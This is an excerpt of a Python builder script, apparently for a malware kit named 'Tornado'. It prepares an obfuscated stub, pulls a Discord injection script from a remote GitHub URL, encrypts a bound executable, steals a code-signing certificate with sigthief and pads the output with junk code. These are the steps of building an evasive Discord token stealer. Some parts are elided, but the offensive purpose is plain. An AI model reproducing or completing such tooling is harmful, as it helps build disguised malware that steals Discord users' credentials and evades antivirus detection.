...
disable_warnings()
import TornadoOBF as obfuscator
from sigthief import outputCert

SettingsFile = "config.json"
InCodeFile = "stub.py"
OutCodeFile = "stub-o.py"
InjectionURL = "https://raw.githubusercontent.com/BenzoXdev/Discord-Injection-BG/main/injection-obfuscated.js"
...
def PrepareEnvironment(settings: dict) -> None:
    if os.path.isfile("bound.exe"):
        ...
        with open("bound.Tornado", "wb") as file:
            file.write(encrypted)
        
    elif os.path.isfile("bound.Tornado"):
        os.remove("bound.Tornado")
...
def main() -> None:
    ...
    obfuscator.TornadoOBF(code, OutCodeFile)
    junk(OutCodeFile)
